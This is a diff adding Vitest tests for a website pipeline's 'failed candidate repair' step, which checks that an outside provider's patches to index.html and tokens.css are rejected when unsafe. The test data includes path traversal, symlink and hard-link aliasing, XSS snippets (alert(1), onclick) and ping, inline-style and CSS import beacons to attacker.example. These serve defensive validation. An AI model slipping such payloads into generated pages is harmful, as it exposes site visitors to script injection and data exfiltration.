@@ -9,12 +9,14 @@ import {
   transitionCandidateProvenance,
 } from "./candidate";
 import { gateBuiltCandidate } from "./builder";
+import * as builderModule from "./builder";
 import {
   CandidateProvenanceV1Schema,
   type CandidateProvenanceV1,
 } from "./contracts";
 import { runCandidateGates } from "./gates";
-import { candidatePaths, sitePaths } from "./runstate";
+import { runPipeline } from "./pipeline";
+import { candidatePaths, createRun, loadRun, sitePaths } from "./runstate";
 
 const gateHarness = vi.hoisted(() => {
   const state = {
@@ -258,6 +260,91 @@ async function expectLiveSentinels(
   );
   expect(sha256(await fs.readFile(path.join(sitePaths(runId).root, "gates.json"))))
     .toBe(sha256(sentinels.liveGates));
+}
+
+type RepairRequest = {
+  failures: Array<{ gate: string; details: string[] }>;
+  files: Array<{ path: "index.html" | "tokens.css"; content: string }>;
+};
+
+type RepairProvider = (request: RepairRequest) => Promise<unknown>;
+
+function candidateRepairApi() {
+  const api = builderModule as typeof builderModule & {
+    repairFailedCandidate?: (
+      runId: string,
+      provider: RepairProvider,
+    ) => Promise<{ state: "failed" | "promotable" } | undefined>;
+    gateAndRepairBuiltCandidate?: (
+      runId: string,
+      provider: RepairProvider,
+    ) => Promise<{
+      disposition: { state: "failed" | "promotable"; receipt: { reports: Array<{ gate: string }> } };
+      repairCompleted: boolean;
+    }>;
+  };
+  expect(api.repairFailedCandidate).toBeTypeOf("function");
+  expect(api.gateAndRepairBuiltCandidate).toBeTypeOf("function");
+  return {
+    repairFailedCandidate: api.repairFailedCandidate!,
+    gateAndRepairBuiltCandidate: api.gateAndRepairBuiltCandidate!,
+  };
+}
+
+async function createFailedRepairCandidate() {
+  const runId = testRunId("repair");
+  await createRun({ id: runId, pipelineVersion: "legacy-v1" });
+  const candidate = await createReadyCandidate(runId);
+  gateHarness.state.contrastPass = false;
+  const disposition = await gateBuiltCandidate(runId);
+  expect(disposition.state).toBe("failed");
+  return { runId, candidate, disposition };
+}
+
+async function snapshotTree(root: string): Promise<Map<string, Buffer>> {
+  const snapshot = new Map<string, Buffer>();
+  async function visit(directory: string): Promise<void> {
+    for (const entry of (await fs.readdir(directory, { withFileTypes: true })).sort(
+      (left, right) => left.name.localeCompare(right.name),
+    )) {
+      const absolute = path.join(directory, entry.name);
+      const relative = path.relative(root, absolute).split(path.sep).join("/");
+      if (entry.isDirectory()) await visit(absolute);
+      else snapshot.set(relative, await fs.readFile(absolute));
+    }
+  }
+  await visit(root);
+  return snapshot;
+}
+
+function expectTreeSnapshot(
+  actual: Map<string, Buffer>,
+  expected: Map<string, Buffer>,
+): void {
+  expect([...actual.keys()]).toEqual([...expected.keys()]);
+  for (const [relative, bytes] of expected) {
+    expect(actual.get(relative)).toEqual(bytes);
+  }
+}
+
+async function rebindFailedCandidate(runId: string): Promise<void> {
+  const paths = candidatePaths(runId);
+  const manifest = await createCandidateManifest(paths.site);
+  await writeJson(paths.manifest, manifest);
+  const receipt = JSON.parse(await fs.readFile(paths.gates, "utf8"));
+  const reboundReceipt = {
+    ...receipt,
+    candidateManifestSha256: candidateManifestSha256(manifest),
+    buildSha256: manifest.buildSha256,
+  };
+  const receiptBytes = await writeJson(paths.gates, reboundReceipt);
+  const provenance = JSON.parse(await fs.readFile(paths.provenance, "utf8"));
+  await writeJson(paths.provenance, {
+    ...provenance,
+    candidateManifestSha256: candidateManifestSha256(manifest),
+    buildSha256: manifest.buildSha256,
+    gateReportSha256: sha256(receiptBytes),
+  });
 }
 
 afterEach(async () => {
@@ -743,5 +830,562 @@ describe("candidate gates", () => {
       "site",
     ]);
     await expectLiveSentinels(writeRunId, sentinels);
+  });
+});
+
+describe("failed candidate repair", () => {
+  it("repairs only the candidate bundle and reruns the complete gate suite", async () => {
+    const { gateAndRepairBuiltCandidate } = candidateRepairApi();
+    const runId = testRunId("repair-full-suite");
+    await createRun({ id: runId, pipelineVersion: "legacy-v1" });
+    const candidate = await createReadyCandidate(runId);
+    const live = await writeLiveSentinels(runId);
+    const approvedEvidence = path.join(
+      sitePaths(runId).root,
+      "evidence",
+      "approved",
+      "visual-qa.json",
+    );
+    await fs.mkdir(path.dirname(approvedEvidence), { recursive: true });
+    await fs.writeFile(approvedEvidence, "approved-evidence-sentinel");
+    const evidenceBefore = await fs.readFile(approvedEvidence);
+    const candidateBefore = await snapshotTree(candidate.paths.root);
+    const mutationTargets: string[] = [];
+    const realWriteFile = fs.writeFile.bind(fs);
+    vi.spyOn(fs, "writeFile").mockImplementation(async (file, data, options) => {
+      mutationTargets.push(String(file));
+      return realWriteFile(file, data, options);
+    });
+    const realRename = fs.rename.bind(fs);
+    vi.spyOn(fs, "rename").mockImplementation(async (from, to) => {
+      mutationTargets.push(String(from), String(to));
+      return realRename(from, to);
+    });
+    const realRm = fs.rm.bind(fs);
+    vi.spyOn(fs, "rm").mockImplementation(async (target, options) => {
+      mutationTargets.push(String(target));
+      return realRm(target, options);
+    });
+    const realCopyFile = fs.copyFile.bind(fs);
+    vi.spyOn(fs, "copyFile").mockImplementation(async (from, to, mode) => {
+      mutationTargets.push(String(to));
+      return realCopyFile(from, to, mode);
+    });
+    gateHarness.state.contrastPass = false;
+    let failedReceiptBytes: Buffer | undefined;
+
+    const result = await gateAndRepairBuiltCandidate(runId, async (request) => {
+      expect(request.failures.map((failure) => failure.gate)).toEqual(["contrast"]);
+      failedReceiptBytes = await fs.readFile(candidate.paths.gates);
+      gateHarness.state.contrastPass = true;
+      return {
+        files: request.files
+          .filter((file) => file.path === "tokens.css")
+          .map((file) => ({ ...file, content: `${file.content}\n/* repaired */\n` })),
+      };
+    });
+
+    expect(result.repairCompleted).toBe(true);
+    expect(result.disposition.state).toBe("promotable");
+    expect(result.disposition.receipt.reports.map((report) => report.gate)).toEqual(
+      gateNames,
+    );
+    expect(gateHarness.state.contrastCalls).toHaveLength(2);
+    expect(
+      gateHarness.state.contrastCalls.every(
+        (call) => call.siteDir === candidate.paths.site,
+      ),
+    ).toBe(true);
+    expect(await fs.readFile(path.join(candidate.paths.site, "tokens.css"), "utf8"))
+      .toContain("/* repaired */");
+    const finalProvenance = JSON.parse(
+      await fs.readFile(candidate.paths.provenance, "utf8"),
+    );
+    const finalReceiptBytes = await fs.readFile(candidate.paths.gates);
+    const finalReceipt = JSON.parse(finalReceiptBytes.toString("utf8"));
+    expect(finalProvenance).toMatchObject({ state: "promotable" });
+    expect(finalProvenance.history.slice(-4).map((event: { state: string }) => event.state))
+      .toEqual(["failed", "preparing", "ready-for-gates", "promotable"]);
+    expect(finalProvenance.candidateManifestSha256)
+      .not.toBe(candidate.ready.candidateManifestSha256);
+    expect(finalProvenance.buildSha256).not.toBe(candidate.ready.buildSha256);
+    expect(finalProvenance.gateReportSha256).toBe(sha256(finalReceiptBytes));
+    expect(finalReceipt.candidateManifestSha256)
+      .toBe(finalProvenance.candidateManifestSha256);
+    expect(finalReceipt.buildSha256).toBe(finalProvenance.buildSha256);
+    expect(finalReceiptBytes).not.toEqual(failedReceiptBytes);
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(1);
+    const candidateAfter = await snapshotTree(candidate.paths.root);
+    expect(
+      [...new Set([...candidateBefore.keys(), ...candidateAfter.keys()])]
+        .filter(
+          (relative) =>
+            !candidateBefore.get(relative)?.equals(candidateAfter.get(relative) ?? Buffer.alloc(0)),
+        )
+        .sort(),
+    ).toEqual(["gates.json", "manifest.json", "provenance.json", "site/tokens.css"]);
+    const forbiddenMutationRoots = [
+      sitePaths(runId).site,
+      path.dirname(approvedEvidence),
+      path.join(sitePaths(runId).root, "gates.json"),
+    ];
+    expect(
+      mutationTargets.filter((target) =>
+        forbiddenMutationRoots.some(
+          (forbidden) => target === forbidden || target.startsWith(`${forbidden}${path.sep}`),
+        ),
+      ),
+    ).toEqual([]);
+    expect(await fs.readFile(approvedEvidence)).toEqual(evidenceBefore);
+    await expectLiveSentinels(runId, live);
+  });
+
+  it("rejects an unbound failed receipt before claiming or calling the provider", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const receipt = JSON.parse(await fs.readFile(candidate.paths.gates, "utf8"));
+    receipt.candidateManifestSha256 = "e".repeat(64);
+    const receiptBytes = await writeJson(candidate.paths.gates, receipt);
+    const provenance = JSON.parse(
+      await fs.readFile(candidate.paths.provenance, "utf8"),
+    );
+    await writeJson(candidate.paths.provenance, {
+      ...provenance,
+      gateReportSha256: sha256(receiptBytes),
+    });
+
+    await expect(
+      repairFailedCandidate(runId, async () => {
+        throw new Error("provider must not run");
+      }),
+    ).rejects.toThrow(/receipt.*compiled candidate|manifest/i);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+  });
+
+  it("rejects linked candidate artifacts before claiming the allowance", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const tokensPath = path.join(candidate.paths.site, "tokens.css");
+    await fs.rm(tokensPath);
+    await fs.symlink(path.join(sitePaths(runId).site, "index.html"), tokensPath);
+
+    await expect(
+      repairFailedCandidate(runId, async () => {
+        throw new Error("provider must not run");
+      }),
+    ).rejects.toThrow(/symlink/);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+  });
+
+  it("rejects hard-linked candidate artifacts before claiming the allowance", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const tokensPath = path.join(candidate.paths.site, "tokens.css");
+    const aliasPath = path.join(sitePaths(runId).root, "tokens-hardlink.css");
+    await fs.link(tokensPath, aliasPath);
+
+    await expect(
+      repairFailedCandidate(runId, async () => {
+        throw new Error("provider must not run");
+      }),
+    ).rejects.toThrow(/hardlink/);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+  });
+
+  it.each([
+    ["traversal", [{ path: "../../site/index.html", content: "owned" }]],
+    [
+      "duplicate",
+      [
+        { path: "index.html", content: "first" },
+        { path: "index.html", content: "second" },
+      ],
+    ],
+    ["non-allow-listed", [{ path: "site.css", content: "owned" }]],
+  ])("rejects %s repair output and releases the allowance", async (_label, files) => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const before = await snapshotTree(candidate.paths.root);
+
+    await expect(
+      repairFailedCandidate(runId, async () => ({ files })),
+    ).rejects.toThrow();
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expectTreeSnapshot(await snapshotTree(candidate.paths.root), before);
+  });
+
+  it.each([
+    [
+      "removed data-edit-id",
+      "index.html",
+      (content: string) => content.replace(' data-edit-id="hero.headline"', ""),
+    ],
+    [
+      "changed data-edit-id",
+      "index.html",
+      (content: string) => content.replace("hero.headline", "attacker.control"),
+    ],
+    [
+      "new script",
+      "index.html",
+      (content: string) => content.replace("</body>", "<script>alert(1)</script></body>"),
+    ],
+    [
+      "remote request",
+      "index.html",
+      (content: string) => content.replace("tel:5550100", "https://attacker.example/collect"),
+    ],
+    [
+      "event handler",
+      "index.html",
+      (content: string) => content.replace("<main>", '<main onclick="alert(1)">'),
+    ],
+    [
+      "link ping request",
+      "index.html",
+      (content: string) =>
+        content.replace("href=\"tel:5550100\"", 'href="tel:5550100" ping="https://attacker.example/collect"'),
+    ],
+    [
+      "inline style expansion",
+      "index.html",
+      (content: string) =>
+        content.replace("<main>", '<main style="background-image:url(https://attacker.example/x)">'),
+    ],
+    [
+      "structural expansion",
+      "index.html",
+      (content: string) => content.replace("<h1 ", "<div><h1 ").replace("</h1>", "</h1></div>"),
+    ],
+    [
+      "remote CSS import",
+      "tokens.css",
+      (content: string) => `@import url(https://attacker.example/a.css);\n${content}`,
+    ],
+    [
+      "new CSS selector",
+      "tokens.css",
+      (content: string) => `${content}\nbody { background-image: url(https://attacker.example/x); }\n`,
+    ],
+    [
+      "escaped CSS request",
+      "tokens.css",
+      (content: string) =>
+        content.replace("#ffffff", "\\75rl(https://attacker.example/x)"),
+    ],
+  ])("rejects repair output with %s", async (_label, repairPath, mutate) => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const before = await snapshotTree(candidate.paths.root);
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => {
+        const original = request.files.find((file) => file.path === repairPath)!;
+        return {
+          files: [{ ...original, content: mutate(original.content) }],
+        };
+      }),
+    ).rejects.toThrow(/repair|structure|script|remote|data-edit-id|CSS/i);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expectTreeSnapshot(await snapshotTree(candidate.paths.root), before);
+  });
+
+  it("treats identical provider output as no repair and releases the allowance", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const before = await snapshotTree(candidate.paths.root);
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => ({
+        files: [request.files.find((file) => file.path === "tokens.css")!],
+      })),
+    ).resolves.toBeUndefined();
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expectTreeSnapshot(await snapshotTree(candidate.paths.root), before);
+    expect(gateHarness.state.contrastCalls).toHaveLength(1);
+  });
+
+  it("rejects aggregate provider output over the repair text budget", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const before = await snapshotTree(candidate.paths.root);
+
+    await expect(
+      repairFailedCandidate(runId, async () => ({
+        files: [{ path: "tokens.css", content: "x".repeat(1024 * 1024 + 1) }],
+      })),
+    ).rejects.toThrow(/repair.*size|repair.*bytes|too big/i);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expectTreeSnapshot(await snapshotTree(candidate.paths.root), before);
+  });
+
+  it("rejects oversized repair inputs before claiming or calling the provider", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const indexPath = path.join(candidate.paths.site, "index.html");
+    await fs.appendFile(indexPath, `<!--${"x".repeat(1024 * 1024)}-->`);
+    await rebindFailedCandidate(runId);
+
+    await expect(
+      repairFailedCandidate(runId, async () => {
+        throw new Error("provider must not run");
+      }),
+    ).rejects.toThrow(/repair.*input.*size|repair.*input.*bytes|too big/i);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+  });
+
+  it("detects provider-time candidate substitution and releases the allowance", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const tokensPath = path.join(candidate.paths.site, "tokens.css");
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => {
+        await fs.appendFile(tokensPath, "\n/* substituted during provider */\n");
+        const tokens = request.files.find((file) => file.path === "tokens.css")!;
+        return {
+          files: [{ ...tokens, content: `${tokens.content}\n/* proposed */\n` }],
+        };
+      }),
+    ).rejects.toThrow(/candidate|mismatch|changed/i);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+  });
+
+  it("releases the allowance and preserves exact bytes when staging a repair fails", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const before = await snapshotTree(candidate.paths.root);
+    const realWriteFile = fs.writeFile.bind(fs);
+    vi.spyOn(fs, "writeFile").mockImplementation(async (file, data, options) => {
+      if (
+        path.basename(String(file)) === "tokens.css" &&
+        String(file) !== path.join(candidate.paths.site, "tokens.css")
+      ) {
+        throw new Error("seeded repair write failure");
+      }
+      return realWriteFile(file, data, options);
+    });
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => ({
+        files: request.files
+          .filter((file) => file.path === "tokens.css")
+          .map((file) => ({
+            ...file,
+            content: `${file.content}\n/* seeded write */\n`,
+          })),
+      })),
+    ).rejects.toThrow("seeded repair write failure");
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expectTreeSnapshot(await snapshotTree(candidate.paths.root), before);
+  });
+
+  it("restores the failed candidate and releases the allowance when bundle commit fails", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const live = await writeLiveSentinels(runId);
+    const approvedEvidence = path.join(
+      sitePaths(runId).root,
+      "evidence",
+      "approved",
+      "visual-qa.json",
+    );
+    await fs.mkdir(path.dirname(approvedEvidence), { recursive: true });
+    await fs.writeFile(approvedEvidence, "approved-evidence-sentinel");
+    const evidenceBefore = await fs.readFile(approvedEvidence);
+    const before = await snapshotTree(candidate.paths.root);
+    const realRename = fs.rename.bind(fs);
+    let seeded = false;
+    vi.spyOn(fs, "rename").mockImplementation(async (from, to) => {
+      if (!seeded && String(to) === candidate.paths.root) {
+        seeded = true;
+        throw new Error("seeded repair bundle commit failure");
+      }
+      return realRename(from, to);
+    });
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => ({
+        files: request.files
+          .filter((file) => file.path === "tokens.css")
+          .map((file) => ({
+            ...file,
+            content: `${file.content}\n/* seeded commit */\n`,
+          })),
+      })),
+    ).rejects.toThrow("seeded repair bundle commit failure");
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expectTreeSnapshot(await snapshotTree(candidate.paths.root), before);
+    expect(await fs.readFile(approvedEvidence)).toEqual(evidenceBefore);
+    await expectLiveSentinels(runId, live);
+  });
+
+  it("revalidates the retired source bundle immediately before repair commit", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const realRename = fs.rename.bind(fs);
+    let substituted = false;
+    vi.spyOn(fs, "rename").mockImplementation(async (from, to) => {
+      if (!substituted && String(from) === candidate.paths.root) {
+        substituted = true;
+        await fs.appendFile(
+          path.join(candidate.paths.site, "tokens.css"),
+          "\n/* substituted before rename */\n",
+        );
+      }
+      return realRename(from, to);
+    });
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => {
+        const tokens = request.files.find((file) => file.path === "tokens.css")!;
+        return {
+          files: [{ ...tokens, content: `${tokens.content}\n/* proposed */\n` }],
+        };
+      }),
+    ).rejects.toThrow(/candidate.*changed|source.*changed|mismatch/i);
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(0);
+    expect(await fs.readFile(path.join(candidate.paths.site, "tokens.css"), "utf8"))
+      .toContain("substituted before rename");
+    expect(await fs.readFile(path.join(candidate.paths.site, "tokens.css"), "utf8"))
+      .not.toContain("/* proposed */");
+  });
+
+  it("releases provider failures but consumes a completed repair that still fails gates", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const first = await createFailedRepairCandidate();
+
+    await expect(
+      repairFailedCandidate(first.runId, async () => {
+        throw new Error("provider unavailable");
+      }),
+    ).rejects.toThrow("provider unavailable");
+    expect((await loadRun(first.runId)).stages.built.gateRepairAttempts).toBe(0);
+
+    const result = await repairFailedCandidate(first.runId, async (request) => ({
+      files: request.files
+        .filter((file) => file.path === "tokens.css")
+        .map((file) => ({ ...file, content: `${file.content}\n/* no-op repair */\n` })),
+    }));
+    expect(result?.state).toBe("failed");
+    expect((await loadRun(first.runId)).stages.built.gateRepairAttempts).toBe(1);
+    expect(gateHarness.state.contrastCalls).toHaveLength(2);
+
+    await expect(
+      repairFailedCandidate(first.runId, async () => {
+        throw new Error("completed repair must not repeat");
+      }),
+    ).resolves.toBeUndefined();
+    expect((await loadRun(first.runId)).stages.built.gateRepairAttempts).toBe(1);
+
+    const candidateBeforeReconnect = await snapshotTree(first.candidate.paths.root);
+    const executePipeline = vi.fn(async () => {
+      throw new Error("reconnect must not rebuild or call the provider");
+    });
+    await runPipeline(first.runId, vi.fn(), {
+      readEvents: vi.fn().mockResolvedValue([]),
+      loadRun,
+      loadArtifact: vi.fn().mockResolvedValue({
+        businessName: "Candidate Co",
+        category: "service",
+        location: "Portland, OR",
+        services: ["Service"],
+        phone: "555-0100",
+        primaryAction: "call",
+        projectTarget: "website",
+        certifications: [],
+        claims: [],
+        vibeWords: [],
+        research: {
+          enabled: false,
+          businessIntelligence: false,
+          referoDesignEvidence: false,
+          allowPaidFirecrawlFallback: false,
+        },
+        uploads: [],
+      }),
+      appendEvent: vi.fn(),
+      inspectCandidate: async () =>
+        (await import("./candidate")).inspectCandidate(first.runId),
+      executePipeline,
+    });
+    expect(executePipeline).not.toHaveBeenCalled();
+    expectTreeSnapshot(
+      await snapshotTree(first.candidate.paths.root),
+      candidateBeforeReconnect,
+    );
+  });
+
+  it("consumes the allowance when repaired-candidate gate execution fails", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => {
+        gateHarness.state.gotoError = new Error("repaired candidate gate crashed");
+        const tokens = request.files.find((file) => file.path === "tokens.css")!;
+        return {
+          files: [{ ...tokens, content: `${tokens.content}\n/* completed */\n` }],
+        };
+      }),
+    ).rejects.toThrow("repaired candidate gate crashed");
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(1);
+    expect(JSON.parse(await fs.readFile(candidate.paths.provenance, "utf8")))
+      .toMatchObject({ state: "failed" });
+    gateHarness.state.gotoError = undefined;
+    await expect(
+      repairFailedCandidate(runId, async () => {
+        throw new Error("completed repair must not call provider twice");
+      }),
+    ).resolves.toBeUndefined();
+  });
+
+  it("fails closed and consumes the allowance when repaired disposition publication fails", async () => {
+    const { repairFailedCandidate } = candidateRepairApi();
+    const { runId, candidate } = await createFailedRepairCandidate();
+    const realRename = fs.rename.bind(fs);
+    let seeded = false;
+    vi.spyOn(fs, "rename").mockImplementation(async (from, to) => {
+      if (
+        !seeded &&
+        String(to) === candidate.paths.provenance &&
+        String(from).includes(".candidate-provenance.")
+      ) {
+        seeded = true;
+        throw new Error("repaired disposition publication failed");
+      }
+      return realRename(from, to);
+    });
+
+    await expect(
+      repairFailedCandidate(runId, async (request) => {
+        const tokens = request.files.find((file) => file.path === "tokens.css")!;
+        return {
+          files: [{ ...tokens, content: `${tokens.content}\n/* completed */\n` }],
+        };
+      }),
+    ).rejects.toThrow("repaired disposition publication failed");
+
+    expect((await loadRun(runId)).stages.built.gateRepairAttempts).toBe(1);
+    expect(JSON.parse(await fs.readFile(candidate.paths.provenance, "utf8")))
+      .toMatchObject({ state: "failed" });
+    await expect(
+      repairFailedCandidate(runId, async () => {
+        throw new Error("completed repair must not call provider twice");
+      }),
+    ).resolves.toBeUndefined();
   });
 });
